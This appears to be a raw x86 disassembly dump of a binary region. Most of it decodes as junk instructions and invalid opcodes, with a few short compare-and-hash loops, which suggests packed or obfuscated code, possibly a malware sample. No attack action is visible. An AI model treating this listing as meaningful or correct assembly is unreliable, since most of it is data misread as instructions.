  407fd0:	inc    esp
  407fd1:	iret   
  407fd2:	push   ss
  407fd3:	shl    BYTE PTR [ebp-0x2ca01ec0],cl
  407fd9:	in     eax,dx
  407fda:	dec    ecx
  407fdb:	ret    
  407fdc:	into   
  407fdd:	lods   eax,DWORD PTR ds:[esi]
  407fde:	std    
  407fdf:	imul   eax,DWORD PTR [edi-0x158278ac],0x9b47d8d6
  407fe9:	stc    
  407fea:	popa   
  407feb:	je     0x408016
  407fed:	ss mov ch,0x4c
  407ff0:	fsubr  QWORD PTR [ecx]
  407ff2:	pop    ecx
  407ff3:	pop    esp
  407ff4:	sub    ebp,esp
  407ff6:	or     BYTE PTR ds:0x2cc466ca,dl
  407ffc:	int    0x7e
  407ffe:	sub    al,0xec
  408000:	lods   al,BYTE PTR ds:[esi]
  408001:	xor    BYTE PTR [ebp-0x5d2f0405],ah
  408007:	push   ss
  408008:	fprem1 
  40800a:	loop   0x407fce
  40800c:	(bad)  
  40800d:	xlat   BYTE PTR ds:[ebx]
  40800e:	adc    cl,BYTE PTR [edi-0x4d9843d4]
  408014:	jg     0x40803b
  408016:	(bad)  
  408017:	sbb    bh,BYTE PTR [ebx]
  408019:	inc    ecx
  40801b:	imul   esp,DWORD PTR [ecx-0x4a],0x4c
  40801f:	inc    esi
  408020:	call   0x1e7:0x133f54a
  408027:	enter  0xfdad,0x6
  40802b:	into   
  40802c:	jge    0x40803d
  40802e:	pop    edi
  40802f:	popa   
  408030:	xchg   edx,eax
  408031:	adc    eax,0xda9ddab9
  408036:	and    BYTE PTR [ebx-0x6f],0xd7
  40803a:	fbstp  TBYTE PTR ds:0xbc539c50
  408040:	sub    BYTE PTR [edx+eiz*1+0x30],dl
  408044:	aam    0x60
  408046:	cs (bad) 
  408049:	test   al,0x57
  40804b:	scas   al,BYTE PTR es:[edi]
  40804c:	mov    edi,0x6d65d8fc
  408051:	retf   0xf48e
  408054:	xor    DWORD PTR ss:[edx],edx
  408057:	mov    eax,ds:0x7a9567ab
  40805c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40805d:	int3   
  40805e:	popa   
  40805f:	ss mov edx,0xacbab3f3
  408065:	ds jmp 0xe683:0xe2fdf005
  40806d:	sti    
  40806e:	or     ch,bh
  408070:	aas    
  408071:	mov    ch,0x91
  408073:	jae    0x408064
  408075:	test   al,0xec
  408077:	int3   
  408078:	xor    cl,BYTE PTR [edi+0x71]
  40807b:	scas   al,BYTE PTR es:[edi]
  40807c:	inc    ebp
  40807d:	xor    ah,BYTE PTR [esi+0x69f55548]
  408083:	xor    eax,0xc0fa83d5
  408088:	loop   0x408066
  40808a:	dec    ebx
  40808b:	pop    edx
  40808c:	fcom   QWORD PTR [esi]
  40808e:	and    ebx,DWORD PTR [ecx+0x7aa21c0]
  408094:	xchg   edi,eax
  408095:	sbb    cl,BYTE PTR [ebp+0x1233b9c0]
  40809b:	data16 jl 0x4080ed
  40809e:	ret    0xb42
  4080a1:	adc    eax,0x4cdb2e3c
  4080a6:	xchg   esi,eax
  4080a7:	sbb    edx,DWORD PTR [edx+0x61ab6da2]
  4080ad:	xabort 0x38
  4080b0:	mov    esi,0x2cab5a77
  4080b5:	mov    esi,0x82abc12d
  4080ba:	loop   0x408126
  4080bc:	lods   al,BYTE PTR ds:[esi]
  4080bd:	add    edx,esi
  4080bf:	pop    ebp
  4080c0:	xchg   ebx,eax
  4080c1:	retf   0x7b6f
  4080c4:	sub    eax,0x554d221a
  4080c9:	sub    DWORD PTR [ebx-0x52316197],edi
  4080cf:	iret   
  4080d0:	mov    BYTE PTR [ebx],dh
  4080d2:	rol    DWORD PTR [ebx],0xc6
  4080d5:	mov    DWORD PTR [edx],eax
  4080d7:	mov    eax,DWORD PTR [ebp-0x8]
  4080da:	xor    eax,ecx
  4080dc:	add    eax,esi
  4080de:	mov    DWORD PTR [ebp+0x8],eax
  4080e1:	mov    eax,DWORD PTR [ebp+0x8]
  4080e4:	jmp    0x4083ed
  4080e9:	ret    
  4080ea:	ror    ch,1
  4080ec:	rcr    ecx,0xc9
  4080ef:	rcl    esi,cl
  4080f1:	push   edx
  4080f2:	add    DWORD PTR [edx-0x7a6cd98b],eax
  4080f8:	pop    esp
  4080f9:	hlt    
  4080fa:	fnstsw WORD PTR [eax+0x78]
  4080fd:	fs jle 0x408178
  408100:	js     0x40808b
  408102:	sub    BYTE PTR ds:0xb8e85c7d,al
  408108:	jge    0x4080fc
  40810a:	(bad)  
  40810b:	test   ah,0xdb
  40810e:	test   BYTE PTR [ebp+edi*4+0x5d],dl
  408112:	in     eax,dx
  408113:	sbb    ch,dl
  408115:	stos   BYTE PTR es:[edi],al
  408116:	mov    esi,DWORD PTR [eax+0x50ce588b]
  40811c:	push   edi
  40811d:	add    edi,DWORD PTR [edx+0x2d]
  408120:	inc    edi
  408121:	sub    DWORD PTR [ebx+0x711dd9f5],edi
  408127:	inc    ebp
  408128:	std    
  408129:	mov    bl,0x3f
  40812b:	and    bh,BYTE PTR [ebp+0x530395aa]
  408131:	dec    eax
  408132:	cwde   
  408133:	gs jnp 0x40811c
  408136:	mov    esi,0xa27dc54a
  40813b:	mov    ebx,0x67efa263
  408140:	mov    ah,BYTE PTR [eax-0x2e]
  408143:	mov    esp,0x3c6d9d1d
  408148:	cmp    eax,0x584576b9
  40814d:	shr    ah,1
  40814f:	fild   DWORD PTR [esi+esi*4-0x27]
  408153:	push   edx
  408154:	(bad)  
  408155:	xor    BYTE PTR [esp+eax*8],ch
  408158:	imul   eax,DWORD PTR [edx],0x7
  40815b:	dec    eax
  40815c:	(bad)  
  40815e:	inc    ecx
  40815f:	int3   
  408160:	mov    gs,WORD PTR [edi-0x6e]
  408163:	fcmovb st,st(4)
  408165:	dec    edi
  408166:	add    DWORD PTR [edi+0x50461217],edi
  40816c:	mov    dh,0xb6
  40816e:	adc    dl,cl
  408170:	gs push eax
  408172:	and    BYTE PTR [ecx+eiz*2-0x60288fd],ah
  408179:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40817a:	hlt    
  40817b:	inc    ebp
  40817c:	xor    edx,edx
  40817e:	or     BYTE PTR [edx],dh
  408180:	push   ds
  408181:	jmp    0xdd9c:0xba48f4a7
  408188:	jg     0x40814c
  40818a:	sub    BYTE PTR [edx+0x2b],ah
  40818d:	mov    esi,0x5284ecf3
  408192:	call   0xfe7d:0xa050199f
  408199:	int3   
  40819a:	stc    
  40819b:	sub    edi,esi
  40819d:	push   esi
  40819e:	push   DWORD PTR [esi+0x3e702c17]
  4081a4:	jbe    0x4081b8
  4081a6:	mov    edi,ss
  4081a8:	pop    ebp
  4081a9:	ss addr16 (bad) 
  4081ac:	imul   edx,DWORD PTR [ebx+0x2c0a8e2b],0xffffffe9
  4081b3:	sub    BYTE PTR [ebx+0x2b],bl
  4081b6:	jbe    0x408193
  4081b8:	pusha  
  4081b9:	and    ch,al
  4081bb:	out    dx,eax
  4081bc:	xchg   ebx,eax
  4081bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081be:	jmp    FWORD PTR [ebp+0x6b]
  4081c1:	ret    0x4280
  4081c4:	cs push ds
  4081c6:	xchg   ecx,edi
  4081c8:	out    0xb1,eax
  4081ca:	loop   0x408233
  4081cc:	shl    BYTE PTR [edx+0x7f7dffad],1
  4081d2:	push   ebx
  4081d3:	inc    esi
  4081d4:	imul   ebp,DWORD PTR [edi+0x4d478e40],0xffffff9c
  4081db:	enter  0xde31,0xaa
  4081df:	mov    al,es:0x1446df58
  4081e5:	xchg   edx,eax
  4081e6:	dec    eax
  4081e7:	and    DWORD PTR gs:[ebp+0x4f],esi
  4081eb:	shr    BYTE PTR [esi-0x2e],0xa0
  4081ef:	jmp    DWORD PTR [esi+0x32a2973f]
  4081f5:	push   0x73
  4081f7:	inc    eax
  4081f8:	mov    bl,0xb
  4081fa:	xchg   edx,eax
  4081fb:	adc    al,BYTE PTR [ecx-0x7f174273]
  408201:	pop    ss
  408202:	jmp    0xd8aa8c36
  408207:	je     0x408219
  408209:	js     0x4081b2
  40820b:	test   eax,0x744d6caa
  408210:	js     0x40826b
  408212:	xchg   edi,eax
  408213:	enter  0xba37,0x50
  408217:	aad    0xab
  408219:	xchg   edi,eax
  40821a:	jne    0x4081ee
  40821c:	add    DWORD PTR [eax-0x3c],0x6ccdb11c
  408223:	mov    edx,0x2330835
  408228:	stc    
  408229:	jnp    0x408237
  40822b:	mov    ebx,0x5b09893d
  408230:	xor    DWORD PTR [ecx+0x78],eax
  408233:	add    DWORD PTR [ecx-0x390ba2e0],ecx
  408239:	mov    WORD PTR [ecx],ss
  40823b:	popf   
  40823c:	dec    edx
  40823d:	scas   al,BYTE PTR es:[edi]
  40823e:	push   ebp
  40823f:	sbb    eax,0xc4897747
  408244:	out    dx,al
  408245:	shl    DWORD PTR [eax+0x35ba1709],0x85
  40824c:	retf   0x5d0
  40824f:	cmp    edx,edi
  408251:	ins    DWORD PTR es:[edi],dx
  408252:	lods   eax,DWORD PTR ds:[esi]
  408253:	push   ds
  408254:	lahf   
  408255:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408256:	sub    BYTE PTR [ebp+ebp*8+0x189d3a48],0xd3
  40825e:	outs   dx,DWORD PTR ds:[esi]
  40825f:	call   0x6d49e425
  408264:	fdiv   QWORD PTR [ebx]
  408266:	cdq    
  408267:	ss leave 
  408269:	fist   DWORD PTR [eax]
  40826b:	mov    eax,0x84750e6b
  408270:	cs imul edi,esi,0xffffff94
  408274:	sub    al,0xf5
  408276:	xchg   ebp,eax
  408277:	pop    esp
  408278:	sub    al,0x81
  40827a:	fidiv  DWORD PTR [eax+esi*8]
  40827d:	jmp    0x4082b1
  40827f:	out    0x8d,eax
  408281:	jnp    0x408246
  408283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408284:	daa    
  408285:	jbe    0x408247
  408287:	(bad)  
  408288:	xor    DWORD PTR [edi],ebp
  40828a:	rdmsr  
  40828c:	pop    ebp
  40828d:	pop    edx
  40828e:	pop    edi
  40828f:	sbb    ch,dh
  408291:	xor    DWORD PTR [ecx-0x5f284598],ecx
  408297:	sub    eax,0x589a6a80
  40829c:	data16 jns 0x408302
  40829f:	in     eax,0x94
  4082a1:	push   esi
  4082a2:	jne    0x40823d
  4082a4:	and    dl,BYTE PTR [esi+ebp*8]
  4082a7:	sar    eax,cl
  4082a9:	pop    ds
  4082aa:	in     eax,0xd5
  4082ac:	stos   BYTE PTR es:[edi],al
  4082ad:	popa   
  4082ae:	les    edi,FWORD PTR ds:0x942ffd07
  4082b4:	ror    DWORD PTR [ecx+eiz*8],1
  4082b7:	sub    ecx,ebx
  4082b9:	loope  0x4082aa
  4082bb:	push   ds
  4082bc:	out    dx,eax
  4082bd:	inc    eax
  4082be:	popf   
  4082bf:	stos   BYTE PTR es:[edi],al
  4082c0:	out    0xd7,al
  4082c2:	jbe    0x408310
  4082c4:	fist   DWORD PTR [edx]
  4082c6:	mov    esi,0x52ffc7ae
  4082cb:	mov    eax,ds:0xe22aaaf7
  4082d0:	popf   
  4082d1:	push   eax
  4082d2:	scas   al,BYTE PTR es:[edi]
  4082d3:	adc    ebx,DWORD PTR [ebp+0x70]
  4082d6:	daa    
  4082d7:	int    0x4d
  4082d9:	sub    ah,BYTE PTR [ebp-0x8]
  4082dc:	xor    esi,DWORD PTR [edx+ebp*4+0x6c]
  4082e0:	lock mov cl,0xe4
  4082e3:	mov    BYTE PTR [edi+0x2e440c3a],ch
  4082e9:	sahf   
  4082ea:	and    al,BYTE PTR [esi+0x71]
  4082ed:	adc    ecx,DWORD PTR [eax]
  4082ef:	iret   
  4082f0:	leave  
  4082f1:	xchg   edx,eax
  4082f2:	dec    esp
  4082f3:	sub    al,0x2b
  4082f5:	push   0x23bd250e
  4082fa:	pop    edx
  4082fb:	pop    ebp
  4082fc:	ins    BYTE PTR es:[edi],dx
  4082fd:	sub    esi,esi
  4082ff:	jnp    0x40828a
  408301:	ficomp DWORD PTR [ebx+0x731cd8af]
  408307:	sti    
  408308:	stos   DWORD PTR es:[edi],eax
  408309:	pop    ecx
  40830a:	or     al,0xa0
  40830c:	push   ecx
  40830d:	or     BYTE PTR [ebx+0x46],ch
  408310:	bound  ebx,QWORD PTR [esi+0x64]
  408313:	jmp    0x40833c
  408315:	scas   al,BYTE PTR es:[edi]
  408316:	aaa    
  408317:	mov    esp,0xdb9d4848
  40831c:	xor    eax,eax
  40831e:	mov    ds:0x9db034c,eax
  408323:	jb     0x4082da
  408325:	sbb    eax,0x84ac99fc
  40832a:	rcr    DWORD PTR [esi+0x12],1
  40832d:	mov    ebx,DWORD PTR [ebp+ebp*2+0x118ecb0b]
  408334:	mov    ecx,0x3de28f4e
  408339:	ds jno 0x4083a4
  40833c:	out    dx,eax
  40833d:	enter  0x5391,0x51
  408341:	fst    DWORD PTR [ebp-0x63]
  408344:	cmc    
  408345:	mov    ecx,0x70596f63
  40834a:	(bad)  
  40834b:	jae    0x4083ae
  40834d:	dec    ebx
  40834e:	push   ds
  40834f:	aaa    
  408350:	or     cl,BYTE PTR [ebp+0x4]
  408353:	(bad)  
  408354:	out    dx,al
  408355:	xor    al,0x5b
  408357:	shl    BYTE PTR [esi+0x31],cl
  40835a:	cmp    eax,0x9620f1da
  40835f:	inc    ebp
  408360:	sbb    al,0x99
  408362:	xor    al,0x3e
  408364:	test   DWORD PTR [eax],edx
  408366:	cmp    DWORD PTR [ebp-0x72f1f69],ebp
  40836c:	int    0xac
  40836e:	lods   eax,DWORD PTR ds:[esi]
  40836f:	ficom  DWORD PTR [ebp-0x7ad7f9b8]
  408375:	mov    edx,0xeb80dcbd
  40837a:	in     eax,0x2
  40837c:	(bad)
  40837f:	(bad)  
  408381:	jmp    0xabb1:0x174db14
  408388:	repnz iret 
  40838a:	imul   edx,DWORD PTR [ebx+0x3c8fef44],0xffffffec
  408391:	push   eax
  408392:	popf   
  408393:	fisubr DWORD PTR [esi-0x67]
  408396:	fmul   QWORD PTR [ecx+0x40449f9c]
  40839c:	sub    ebx,DWORD PTR [ebx-0x2acbaef7]
  4083a2:	rol    DWORD PTR [esi],0x90
  4083a5:	aaa    
  4083a6:	loope  0x408390
  4083a8:	data16 sbb BYTE PTR ds:0x62ce6e43,dl
  4083af:	mov    dh,0xae
  4083b1:	or     al,0x8
  4083b3:	std    
  4083b4:	sbb    eax,0xd04c00e0
  4083b9:	scas   eax,DWORD PTR es:[edi]
  4083ba:	inc    eax
  4083bb:	xor    bh,BYTE PTR [edx+0x24]
  4083be:	dec    ebp
  4083bf:	inc    esp
  4083c0:	cmp    eax,0x88071cf1
  4083c5:	es arpl cx,sp
  4083c8:	cld    
  4083c9:	jp     0x408438
  4083cb:	in     eax,dx
  4083cc:	aaa    
  4083cd:	pusha  
  4083ce:	jb     0x408413
  4083d0:	or     al,BYTE PTR [ebx]
  4083d2:	(bad)  
  4083d3:	jmp    0x347d:0x92f954fe
  4083da:	sub    DWORD PTR [ebx+eax*1+0x61c485e5],ecx
  4083e1:	aam    0x3f
  4083e3:	xor    dh,ah
  4083e5:	jmp    FWORD PTR [ecx+0x1189a06e]
  4083eb:	xor    BYTE PTR [edx-0x76],bl
  4083ee:	inc    esp
  4083ef:	add    eax,0xff558aa8
  4083f4:	cmp    al,dl
  4083f6:	je     0x408742
  4083fc:	mov    eax,DWORD PTR [ebp+0x8]
  4083ff:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408403:	mov    edx,DWORD PTR [ebp+0xc]
  408406:	cmp    al,BYTE PTR [edx]
  408408:	jne    0x408a71
  40840e:	mov    eax,DWORD PTR [ebp-0x8]
  408411:	mov    edx,DWORD PTR [ebp+0xc]
  408414:	movsx  edx,BYTE PTR [edx]
  408417:	xor    eax,ecx
  408419:	add    eax,esi
  40841b:	cmp    edx,eax
  40841d:	je     0x40875c
  408423:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  40842a:	jmp    0x408733
  40842f:	cmp    al,0xc8
  408431:	rcl    dl,0xd4
  408434:	fcmovu st,st(2)
  408436:	into   
  408437:	(bad)  
  408438:	leave  
  408439:	xchg   BYTE PTR [edi+0x154e49ab],dl
  40843f:	loopne 0x408423
  408441:	js     0x4084bb
  408443:	fs jle 0x4084be
  408446:	js     0x40844b
  408448:	addr16 jmp 0x408417
  40844b:	push   eax
  40844c:	add    al,0x9c
  40844e:	and    eax,edx
  408450:	mov    al,ds:0xae1cb6ff
  408455:	push   0x48
  408457:	push   ebx
  408458:	std    
  408459:	cdq    
  40845a:	aaa    
  40845b:	loope  0x4083fa
  40845d:	fmul   QWORD PTR [ecx+0x5b]
  408460:	sbb    dh,bh
  408462:	or     DWORD PTR [ebp-0x2d],0xffffffbc
  408466:	fsubr  st(2),st
  408468:	retf   0xf62f
  40846b:	jle    0x40844d
  40846d:	push   ebp
  40846e:	add    DWORD PTR cs:[eax+eax*4+0x395c5a94],ebx
  408476:	icebp  
  408477:	das    
  408478:	or     DWORD PTR [ecx-0x37],edx
  40847b:	jno    0x40847e
  40847d:	and    esi,DWORD PTR [ebx]
  40847f:	call   0x1c48:0x4b092000
  408486:	cmp    eax,0xad059811
  40848b:	and    DWORD PTR [ecx],esp
  40848d:	add    dl,0x6a
  408490:	add    eax,0xc8d2466
  408495:	scas   eax,DWORD PTR es:[edi]
  408496:	push   ebp
  408497:	mov    ah,0xf7
  408499:	mov    al,ds:0x3273a4f9
  40849e:	inc    ebp
  40849f:	pop    ss
  4084a0:	cmc    
  4084a1:	jo     0x4084bb
  4084a3:	or     bh,BYTE PTR [edi]
  4084a5:	adc    dl,BYTE PTR [eax+0x12]
  4084a8:	scas   al,BYTE PTR es:[edi]
  4084a9:	jge    0x408471
  4084ab:	pop    ss
  4084ac:	sbb    al,0x33
  4084ae:	or     DWORD PTR [ebp+0x54],0xfa86e163
  4084b5:	sub    BYTE PTR [eax-0x657bbdbf],dl
  4084bb:	mov    dh,0x65
  4084bd:	push   edi
  4084be:	(bad)  
  4084bf:	arpl   cx,ax
  4084c1:	ret    
  4084c2:	push   eax
  4084c3:	mov    ah,0xbc
  4084c5:	jmp    0x40847a
  4084c7:	pop    eax
  4084c8:	in     al,dx
  4084c9:	jle    0x4084d2
  4084cb:	jno    0x40847a
  4084cd:	jae    0x40852f
  4084cf:	pusha  
  4084d0:	cs ins DWORD PTR es:[edi],dx
  4084d2:	aad    0x3b
  4084d4:	add    BYTE PTR [edi],dl
  4084d6:	sar    DWORD PTR [ecx-0x43],0xff
  4084da:	pop    ss
  4084db:	(bad)  
  4084dc:	(bad)  
  4084dd:	arpl   WORD PTR [edx],di
  4084df:	int3   
  4084e0:	loop   0x40846e
  4084e2:	gs jle 0x40847c
  4084e5:	lock aaa 
  4084e7:	jbe    0x408503
  4084e9:	je     0x4084b1
  4084eb:	dec    edx
  4084ec:	adc    edx,DWORD PTR [ecx-0xf]
  4084ef:	test   ah,cl
  4084f1:	pop    ebx
  4084f2:	int    0xaa
  4084f4:	adc    esi,ecx
  4084f6:	mov    ds:0x9367d4c0,al
  4084fb:	jmp    DWORD PTR [ecx]
  4084fd:	es adc eax,0xa195f81e
  408503:	push   ss
  408504:	sub    bl,BYTE PTR [esp-0x36]
  408508:	adc    BYTE PTR [edi+0xc],dl
  40850b:	jb     0x40857d
  40850d:	jo     0x4084cb
  40850f:	ficomp DWORD PTR [edi]
  408511:	mov    edi,edx
  408513:	jnp    0x4084a3
  408515:	mov    BYTE PTR ds:0x548c3b8a,al
  40851b:	push   es
  40851c:	scas   al,BYTE PTR es:[edi]
  40851d:	fwait
  40851e:	in     eax,0x9b
  408520:	jl     0x4084da
  408522:	fwait
  408523:	xchg   esp,eax
  408524:	mov    cl,0x69
  408526:	sub    al,BYTE PTR [ecx]
  408528:	out    0xf0,al
  40852a:	inc    esp
  40852b:	stc    
  40852c:	test   edx,ecx
  40852e:	or     edi,DWORD PTR [edi+0x12]
  408531:	(bad)  
  408532:	mov    ebp,0x1f3137f2
  408537:	push   cs
  408538:	aas    
  408539:	add    al,0x88
  40853b:	or     esp,ecx
  40853d:	mov    ds:0x9cbd8124,al
  408542:	push   esp
  408543:	pop    ds
  408544:	cdq    
  408545:	mov    DWORD PTR [ecx+0x2a],0x7444a9d3
  40854c:	sub    DWORD PTR [edi],0x7a
  40854f:	inc    ecx
  408550:	cs stos DWORD PTR es:[edi],eax
  408552:	xor    cl,BYTE PTR [ebx]
  408554:	loop   0x408571
  408556:	ja     0x408562
  408558:	stc    
  408559:	and    cl,BYTE PTR [ecx]
  40855b:	jp     0x40859e
  40855d:	aad    0xda
  40855f:	loope  0x4084f9
  408561:	adc    BYTE PTR [edx-0x21375d5e],cl
  408567:	add    cl,BYTE PTR [ecx+0x15678c32]
  40856d:	data16 sahf 
  40856f:	push   0x77
  408571:	jno    0x4085b4
  408573:	dec    edx
  408574:	call   0x8cf7:0xe98a0ced
  40857b:	xchg   BYTE PTR [ebp-0x71ba52be],dh
  408581:	push   ds
  408582:	(bad)  
  408583:	test   cl,bl
  408585:	add    eax,esp
  408587:	aad    0xdf
  408589:	std    
  40858a:	sti    
  40858b:	ret    
  40858c:	xchg   ecx,eax
  40858d:	sbb    al,0x87
  40858f:	and    bl,BYTE PTR es:[esi]
  408592:	inc    eax
  408593:	add    BYTE PTR [esi-0x69],ah
  408596:	xchg   cl,cl
  408598:	leave  
  408599:	jno    0x408562
  40859b:	or     eax,0x56fe5da3
  4085a0:	and    al,0x54
  4085a2:	mov    ds:0x715d3873,al
  4085a7:	xchg   ebx,eax
  4085a8:	test   BYTE PTR [edx+0x79],dl
  4085ab:	push   0x33
  4085ad:	add    BYTE PTR [eax-0x688c1429],dl
  4085b3:	imul   esi,DWORD PTR [edx+0xdb9b33c],0xffffffb6
  4085ba:	cdq    
  4085bb:	rcr    ah,cl
  4085bd:	pop    ss
  4085be:	int    0xa7
  4085c0:	fistp  DWORD PTR [edx-0x44]
  4085c3:	push   cs
  4085c4:	and    DWORD PTR [edx+0x70920447],esi
  4085ca:	mov    ds:0xe40d2383,eax
  4085cf:	jno    0x4085ba
  4085d1:	add    BYTE PTR [eax-0x4b],0xf7
  4085d5:	mov    cl,BYTE PTR [ebx+ebx*1+0x1ad0bf74]
  4085dc:	dec    esp
  4085dd:	bnd jle 0x40860c
  4085e0:	out    dx,eax
  4085e1:	mov    eax,0xa911c7ae
  4085e6:	pop    es
  4085e7:	or     eax,0xe261be76
  4085ec:	fs enter 0x17b0,0x79
  4085f1:	push   ds
  4085f2:	scas   eax,DWORD PTR es:[edi]
  4085f3:	inc    DWORD PTR [ebp-0x7cfaaa91]
  4085f9:	mov    ch,BYTE PTR [esi-0xa9b19ba]
  4085ff:	rol    BYTE PTR [eax+0x67],1
  408602:	dec    esi
  408603:	dec    edx
  408604:	mov    bl,0xae
  408606:	retf   0x1886
  408609:	ds push 0xc
  40860c:	xor    eax,0xed26fb6
  408611:	icebp  
  408612:	sti    
  408613:	test   ch,ah
  408615:	ds jge 0x40859e
  408618:	je     0x408698
  40861a:	(bad)  
  40861b:	fdivr  QWORD PTR [ecx+ecx*1+0x73]
  40861f:	jo     0x408691
  408621:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  408623:	clc    
  408624:	das    
  408625:	mov    esi,0xf235530e
  40862a:	pop    edi
  40862b:	mov    esp,0xf7b376a1
  408630:	xor    eax,0xe820019d
  408635:	jmp    0x16d0a3dd
  40863a:	test   eax,0x724f6731
  40863f:	pop    ebx
  408640:	nop
  408641:	popa   
  408642:	ins    DWORD PTR es:[edi],dx
  408643:	sub    ah,al
  408645:	je     0x408689
  408647:	mov    WORD PTR [eax],ss
  408649:	clc    
  40864a:	sub    ebp,eax
  40864c:	jmp    0xe459797d
  408651:	(bad)  
  408652:	cmp    BYTE PTR [esi],dh
  408654:	mov    eax,0x90a61e1
  408659:	aad    0xa4
  40865b:	adc    ebx,DWORD PTR [ebp+0x3a]
  40865e:	pop    eax
  40865f:	dec    edi
  408660:	pop    esp
  408661:	or     eax,0xef531c9
  408666:	jbe    0x4086d1
  408668:	xchg   edx,eax
  408669:	aam    0xe7
  40866b:	or     eax,0xc5018989
  408670:	in     eax,dx
  408671:	push   esi
  408672:	jo     0x4086da
  408674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408675:	aad    0xdc
  408677:	out    0xa2,al
  408679:	or     DWORD PTR [edi+0x46],ebx
  40867c:	mov    ecx,0xa4b7028a
  408681:	adc    BYTE PTR [ebx],ah
  408683:	test   al,0x66
  408685:	bound  esi,QWORD PTR [ecx+0x5a7d663e]
  40868b:	or     DWORD PTR [edx-0x7b273a36],edx
  408691:	push   ds
  408692:	icebp  
  408693:	add    eax,0xf47f4941
  408698:	scas   al,BYTE PTR es:[edi]
  408699:	retf   
  40869a:	imul   esp,DWORD PTR ds:0x446f4691,0xa5950a86
  4086a4:	xchg   ebp,eax
  4086a5:	xor    esi,DWORD PTR ds:0xab1c77eb
  4086ab:	std    
  4086ac:	les    esi,FWORD PTR [ebx]
  4086ae:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4086b0:	xchg   esp,eax
  4086b1:	ret    
  4086b2:	mov    esp,0x70117af1
  4086b7:	push   esp
  4086b8:	dec    ebx
  4086b9:	dec    ebp
  4086ba:	mov    dh,0x7b
  4086bc:	sahf   
  4086bd:	popf   
  4086be:	jecxz  0x4086e7
  4086c0:	or     ax,0x2457
  4086c4:	cld    
  4086c5:	fnstsw WORD PTR [ebx]
  4086c7:	sbb    ebx,DWORD PTR [edx-0xa4e4bd2]
  4086cd:	xor    bh,cl
  4086cf:	jo     0x408749
  4086d1:	retf   0x9a6b
  4086d4:	test   eax,0x9b94a123
  4086d9:	xor    DWORD PTR [ebx+0x57],esp
  4086dc:	push   edx
  4086dd:	(bad)  [ebp+ebx*8-0x28]
  4086e1:	in     eax,dx
  4086e2:	out    0x3e,eax
  4086e4:	push   ecx
  4086e5:	imul   esp,DWORD PTR [edx],0x1a860249
  4086eb:	xor    ah,BYTE PTR [edi]
  4086ed:	pop    ebp
  4086ee:	mov    dl,0x9c
  4086f0:	sbb    ebx,DWORD PTR [edi+0x7b98eac6]
  4086f6:	add    edi,DWORD PTR [eax+0x30c2ce21]
  4086fc:	jb     0x408714
  4086fe:	mov    esp,0xa0c58c18
  408703:	sub    al,ah
  408705:	jbe    0x408720
  408707:	xchg   edx,eax
  408708:	popa   
  408709:	mov    WORD PTR [edx-0x74348d14],?
  40870f:	cmp    eax,0xec67d509
  408714:	mov    bh,0xbb
  408716:	push   ebp
  408717:	fwait
  408718:	jns    0x4086e6
  40871a:	jo     0x408730
  40871c:	ds mov dl,0x45
  40871f:	test   DWORD PTR [ebp+0x7ffbc315],0xd66b8890
  408729:	jns    0x4086f2
  40872b:	shr    ebx,cl
  40872d:	ret    0xf433
  408730:	pop    ds
  408731:	and    DWORD PTR [eax],0x89e8458d
  408737:	inc    ebp
  408738:	in     al,dx
  408739:	mov    eax,DWORD PTR [ebp-0x14]
  40873c:	add    DWORD PTR [eax],0x705fa8e
  408742:	mov    eax,DWORD PTR [ebp-0x10]
  408745:	mov    edx,DWORD PTR [ebp+0x8]
  408748:	xor    eax,ecx
  40874a:	lea    eax,[eax+edx*1+0x327298]
  408751:	mov    DWORD PTR [ebp+0x8],eax
  408754:	inc    DWORD PTR [ebp+0xc]
  408757:	jmp    0x4080e1
  40875c:	mov    eax,DWORD PTR [ebp-0x10]
  40875f:	xor    eax,ecx
  408761:	mov    ecx,DWORD PTR [ebp+0x10]
  408764:	add    eax,esi
  408766:	jmp    0x408a6f
  40876b:	(bad)
  40876e:	aas    
  40876f:	fld    st(3)
  408771:	(bad)  
  408773:	add    edi,DWORD PTR [ebp-0x7e]
  408776:	sahf   
  408777:	mov    ds:0xcc1756e6,eax
  40877c:	out    0x78,eax
  40877e:	js     0x4087e4
  408780:	jle    0x4087fa
  408782:	js     0x4087a4
  408784:	sub    bl,dl
  408786:	mov    ds:0x148a31ba,al
  40878b:	pop    ss
  40878c:	enter  0x30a0,0x76
  408790:	cmp    eax,0x5c7f843a
  408795:	lds    esi,FWORD PTR [edi-0x30]
  408798:	fs clc 
  40879a:	ja     0x40879f
  40879c:	rol    DWORD PTR [esi],0x50
  40879f:	mov    al,0xcf
  4087a1:	add    eax,0xff0462c3
  4087a6:	jg     0x408764
  4087a8:	xor    BYTE PTR [ecx+0x2fe3a2c2],cl
  4087ae:	or     dh,BYTE PTR [ebx]
  4087b0:	jo     0x40881a
  4087b2:	mov    eax,0x2367db7
  4087b7:	push   cs
  4087b8:	fidivr WORD PTR [esi]
  4087ba:	popf   
  4087bb:	xor    al,0xe1
  4087bd:	push   edx
  4087be:	pop    esp
  4087bf:	jle    0x40875c
  4087c1:	rol    DWORD PTR [eax+esi*4],cl
  4087c4:	movd   mm6,DWORD PTR [esp+esi*8-0x4b]
  4087c9:	(bad)  
  4087ca:	xor    dl,BYTE PTR [edx]
  4087cc:	(bad)  
  4087cd:	fist   WORD PTR [ecx-0x72fcd99c]
  4087d3:	shl    DWORD PTR [ebx+0x5],0xef
  4087d7:	out    0xe1,eax
  4087d9:	or     ch,BYTE PTR [edi+0x3e2916f6]
  4087df:	mov    esi,0xff9361b1
  4087e4:	(bad)  
  4087e5:	jp     0x40882f
  4087e7:	pop    edx
  4087e8:	mov    esp,0x355dc245
  4087ed:	(bad)  
  4087ee:	push   ds
  4087ef:	sbb    al,0x7b
  4087f1:	adc    al,0xbc
  4087f3:	stos   BYTE PTR es:[edi],al
  4087f4:	mov    esi,0xa07c3d8d
  4087f9:	lahf   
  4087fa:	mov    DWORD PTR [eax],esp
  4087fc:	mov    bh,0x2d
  4087fe:	xchg   ebp,eax
